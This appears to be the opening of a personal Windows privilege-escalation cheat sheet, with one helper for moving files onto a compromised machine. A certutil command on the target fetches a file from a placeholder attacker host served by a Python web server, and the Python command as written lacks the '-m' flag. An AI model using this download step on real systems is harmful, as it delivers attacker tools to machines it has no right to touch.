# Windows Privilege Escalation

## Helpers

### Getting files to the target

#### Python HTTP server
```bash
# Attacker machine, in dir of file
python3 http.server PORT

# Target machine in CMD
certutil -urlcache -split -f http://ATTACKER_IP:PORT/FILE DEST
```

## Thought process
